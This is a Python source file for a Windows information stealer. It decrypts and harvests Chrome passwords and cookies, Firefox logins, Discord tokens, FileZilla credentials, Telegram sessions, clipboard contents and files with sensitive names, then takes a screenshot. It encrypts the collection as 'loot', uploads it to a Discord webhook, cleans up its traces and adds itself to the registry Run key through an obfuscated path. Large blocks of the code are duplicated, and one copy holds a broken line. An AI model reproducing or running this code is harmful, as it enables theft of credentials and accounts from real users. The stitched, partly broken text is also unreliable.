import os, re, json, base64, shutil, sqlite3
import subprocess, socket, platform
import win32crypt

from typing import List
import requests
from PIL import ImageGrab
from Crypto.Cipher import AES
from datetime import datetime
import winreg

# === HOT-SWAPPABLE WEBHOOK ===
def get_webhook():
    try:
        with open("config.json", "r") as f:
            return json.load(f)["webhook"]
    except:
        return input("Enter your Discord webhook URL: ").strip()

# === SCREENSHOT ===
def take_screenshot(path):
    try:
        img = ImageGrab.grab()
        img.save(path)
    except:
        pass

# === ZIP + AES ENCRYPTION ===
def zip_and_encrypt(folder, output_file, key_str):
    shutil.make_archive("loot", "zip", folder)
    key = key_str.encode().ljust(32, b'\0')[:32]
    with open("loot.zip", "rb") as f:
        raw = f.read()
    cipher = AES.new(key, AES.MODE_EAX)
    ct, tag = cipher.encrypt_and_digest(raw)
    with open(output_file, "wb") as f:
        f.write(cipher.nonce + tag + ct)
    os.remove("loot.zip")

# === SEND TO DISCORD ===
def send_to_discord(webhook, zip_file):
    with open(zip_file, "rb") as f:
        requests.post(webhook, files={"file": (os.path.basename(zip_file), f)})

# === CLEANUP ===
def clean_temp(folder, zip_path):
    shutil.rmtree(folder, ignore_errors=True)
    if os.path.exists(zip_path):
        os.remove(zip_path)

# === PERSISTENCE (REGISTRY) ===
def add_to_startup(script_path):
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, base64.b64decode(b'U29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUnVu').decode(), 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "Updater", 0, winreg.REG_SZ, script_path)
        winreg.CloseKey(key)
    except:
        pass

# === SAVE DATA ===
def dump_all(folder, data):
    os.makedirs(folder, exist_ok=True)

    with open(f"{folder}/sysinfo.json", "w") as f:
        json.dump(data["sysinfo"], f, indent=2)

    with open(f"{folder}/clipboard.txt", "w") as f:
        f.write(data["clipboard"])

    with open(f"{folder}/chrome_passwords.txt", "w") as f:
        f.write("\n".join(data["chrome_passwords"]))

    with open(f"{folder}/chrome_cookies.txt", "w") as f:
        f.write("\n".join(data["chrome_cookies"]))

    with open(f"{folder}/chrome_history.txt", "w") as f:
        f.write("\n".join(data["chrome_history"]))

    with open(f"{folder}/firefox.txt", "w") as f:
        f.write("\n".join(data["firefox_logins"]))

    with open(f"{folder}/tokens.txt", "w") as f:
        f.write("\n".join(data["discord_tokens"]))

    with open(f"{folder}/filezilla.txt", "w") as f:
        f.write("\n".join(data["filezilla"]))

    with open(f"{folder}/files.txt", "w") as f:
        f.write("\n".join(data["found_files"]))

    with open(f"{folder}/telegram_files.txt", "w") as f:
        f.write("\n".join(data["telegram_sessions"]))

    take_screenshot(f"{folder}/screenshot.png")

# === PATH HELPERS ===
def genv(x): return os.getenv(x)
def path_join(*x): return os.path.join(*x)

def get_chrome_master_key():
    path = path_join(genv("LOCALAPPDATA"), "Google", "Chrome", "User Data", "Local State")
    with open(path, "r", encoding="utf-8") as f:
        local_state = json.load(f)
    enc_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
    return win32crypt.CryptUnprotectData(enc_key, None, None, None, 0)[1]

def decrypt_chrome_value(buff, key):
    from Crypto.Cipher import AES
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(payload)[:-16].decode()
    except:
        return "decryption_failed"

# === CHROME FAMILY ===
def get_chrome_passwords():
    db_path = path_join(genv("LOCALAPPDATA"), "Google", "Chrome", "User Data", "Default", "Login Data")
    if not os.path.exists(db_path): return []
    shutil.copy2(db_path, "cpass.db")
    conn = sqlite3.connect("cpass.db")
    cursor = conn.cursor()
    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
    master = get_chrome_master_key()
    creds = []
    for url, user, pwd in cursor.fetchall():
        decrypted = decrypt_chrome_value(pwd, master)
        creds.append(f"{url} | {user} | {decrypted}")
    conn.close(); os.remove("cpass.db")
    return creds

def get_chrome_cookies():
    db_path = path_join(genv("LOCALAPPDATA"), "Google", "Chrome", "User Data", "Default", "Network", "Cookies")
    if not os.path.exists(db_path): return []
    shutil.copy2(db_path, "ccook.db")
    conn = sqlite3.connect("ccook.db")
    cursor = conn.cursor()
    cursor.execute("SELECT host_key, name, encrypted_value FROM cookies LIMIT 20")
    master = get_chrome_master_key()
    cookies = []
    for host, name, val in cursor.fetchall():
        decrypted = decrypt_chrome_value(val, master)
        cookies.append(f"{host} | {name} = {decrypted}")
    conn.close(); os.remove("ccook.db")
    return cookies

def get_chrome_history():
    db_path = path_join(genv("LOCALAPPDATA"), "Google", "Chrome", "User Data", "Default", "History")
    if not os.path.exists(db_path): return []
    shutil.copy2(db_path, "chist.db")
    conn = sqlite3.connect("chist.db")
    cursor = conn.cursor()
    cursor.execute("SELECT url, title FROM urls ORDER BY last_visit_time DESC LIMIT 20")
    results = [f"{title} - {url}" for url, title in cursor.fetchall()]
    conn.close(); os.remove("chist.db")
    return results

# === DISCORD TOKEN STEALER ===
def get_discord_tokens() -> List[str]:
    paths = [
        path_join(genv("APPDATA"), "Discord", "Local Storage", "leveldb"),
        path_join(genv("APPDATA"), "discordcanary", "Local Storage", "leveldb"),
        path_join(genv("LOCALAPPDATA"), "Google", "Chrome", "User Data", "Default", "Local Storage", "leveldb")
    ]
    token_re = r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}"
    tokens = []
    for path in paths:
        if not os.path.exists(path): continue
        for file in os.listdir(path):
            if not file.endswith(".log") and not file.endswith(".ldb"): continue
            with open(path_join(path, file), errors="ignore") as f:
                for line in f:
                    for token in re.findall(token_re, line):
                        if token not in tokens:
                            tokens.append(token)
    return tokens

# === FIREFOX PASSWORDS ===
def get_firefox_logins():
    ff_path = path_join(genv("APPDATA"), "Mozilla", "Firefox", "Profiles")
    profiles = [d for d in os.listdir(ff_path) if d.endswith(".default-release")]
    result = []
    for prof in profiles:
        logins_path = path_join(ff_path, prof, "logins.json")
        if not os.path.exists(logins_path): continue
        try:
            with open(logins_path, "r") as f:
                j = json.load(f)
                for l in j["logins"]:
                    result.append(f'{l["hostname"]} | {l["encryptedUsername"]} | {l["encryptedPassword"]}')
        except: continue
    return result

# === CLIPBOARD ===
def get_clipboard():
    try:
        return subprocess.check_output("powershell Get-Clipboard", shell=True).decode().strip()
    except: return "no_clipboard"

# === FILEZILLA ===
def get_filezilla_creds():
    xml_path = path_join(genv("APPDATA"), "FileZilla", "recentservers.xml")
    if not os.path.exists(xml_path): return []
    creds = []
    try:
        with open(xml_path, "r", encoding="utf-8") as f:
            raw = f.read()
            hosts = re.findall(r"<Host>(.*?)</Host>", raw)
            users = re.findall(r"<User>(.*?)</User>", raw)
            passes = re.findall(r"<Pass.*?>(.*?)</Pass>", raw)
            for i in range(len(hosts)):
                creds.append(f"{hosts[i]} | {users[i]} | {passes[i]}")
    except: pass
    return creds

# === TELEGRAM SESSION ===
def get_telegram_session():
    tdata = path_join(genv("APPDATA"), "Telegram Desktop", "tdata")
    return [path_join(tdata, f) for f in os.listdir(tdata)] if os.path.exists(tdata) else []

# === TARGETED FILE HARVESTER ===
def search_sensitive_files():
    userdir = os.path.expanduser("~")
    keywords = ["wallet", "password", ".env", "secret", "token"]
    found = []
    for root, dirs, files in os.walk(userdir):
        for file in files:
            if any(k in file.lower() for k in keywords):
                full = path_join(root, file)
                if os.path.getsize(full) < 512000:
                    found.append(full)
        if len(found) >= 20:
            break
    return found

# === SYSTEM INFO ===
def get_sysinfo():
    return {
        "user": os.getenv("USERNAME"),
        "host": socket.gethostname(),
        "ip": socket.gethostbyname(socket.gethostname()),
        "os": f"{platform.system()} {platform.release()}"
    }
import requests
from PIL import ImageGrab
from Crypto.Cipher import AES
from datetime import datetime
import winreg

# === HOT-SWAPPABLE WEBHOOK ===
def get_webhook():
    try:
        with open("config.json", "r") as f:
            return json.load(f)["webhook"]
    except:
        return input(: ").strip()

# === SCREENSHOT ===
def take_screenshot(path):
    try:
        img = ImageGrab.grab()
        img.save(path)
    except:
        pass

# === ZIP + AES ENCRYPTION ===
def zip_and_encrypt(folder, output_file, key_str):
    shutil.make_archive("loot", "zip", folder)
    key = key_str.encode().ljust(32, b'\0')[:32]
    with open("loot.zip", "rb") as f:
        raw = f.read()
    cipher = AES.new(key, AES.MODE_EAX)
    ct, tag = cipher.encrypt_and_digest(raw)
    with open(output_file, "wb") as f:
        f.write(cipher.nonce + tag + ct)
    os.remove("loot.zip")

# === SEND TO DISCORD ===
def send_to_discord(webhook, zip_file):
    with open(zip_file, "rb") as f:
        requests.post(webhook, files={"file": (os.path.basename(zip_file), f)})

# === CLEANUP ===
def clean_temp(folder, zip_path):
    shutil.rmtree(folder, ignore_errors=True)
    if os.path.exists(zip_path):
        os.remove(zip_path)

# === PERSISTENCE (REGISTRY) ===
def add_to_startup(script_path):
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, base64.b64decode(b'U29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUnVu').decode(), 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "Updater", 0, winreg.REG_SZ, script_path)
        winreg.CloseKey(key)
    except:
        pass

# === SAVE DATA ===
def dump_all(folder, data):
    os.makedirs(folder, exist_ok=True)

    with open(f"{folder}/sysinfo.json", "w") as f:
        json.dump(data["sysinfo"], f, indent=2)

    with open(f"{folder}/clipboard.txt", "w") as f:
        f.write(data["clipboard"])

    with open(f"{folder}/chrome_passwords.txt", "w") as f:
        f.write("\n".join(data["chrome_passwords"]))

    with open(f"{folder}/chrome_cookies.txt", "w") as f:
        f.write("\n".join(data["chrome_cookies"]))

    with open(f"{folder}/chrome_history.txt", "w") as f:
        f.write("\n".join(data["chrome_history"]))

    with open(f"{folder}/firefox.txt", "w") as f:
        f.write("\n".join(data["firefox_logins"]))

    with open(f"{folder}/tokens.txt", "w") as f:
        f.write("\n".join(data["discord_tokens"]))

    with open(f"{folder}/filezilla.txt", "w") as f:
        f.write("\n".join(data["filezilla"]))

    with open(f"{folder}/files.txt", "w") as f:
        f.write("\n".join(data["found_files"]))

    with open(f"{folder}/telegram_files.txt", "w") as f:
        f.write("\n".join(data["telegram_sessions"]))

    take_screenshot(f"{folder}/screenshot.png")
if __name__ == "__main__":
    folder = "cache_" + datetime.now().strftime("%H%M%S")
    zip_name = "loot.enc"
    key = "labdemo123"  # AES key
    webhook = get_webhook()

    data = {
        "sysinfo": get_sysinfo(),
        "clipboard": get_clipboard(),
        "chrome_passwords": get_chrome_passwords(),
        "chrome_cookies": get_chrome_cookies(),
        "chrome_history": get_chrome_history(),
        "firefox_logins": get_firefox_logins(),
        "discord_tokens": get_discord_tokens(),
        "filezilla": get_filezilla_creds(),
        "telegram_sessions": get_telegram_session(),
        "found_files": search_sensitive_files()
    }

    dump_all(folder, data)
    zip_and_encrypt(folder, zip_name, key)
    send_to_discord(webhook, zip_name)
    clean_temp(folder, zip_name)

    # add startup persistence (for .exe)
    exe_path = os.path.realpath(sys.argv[0])
    if exe_path.endswith(".exe"):
        add_to_startup(exe_path)
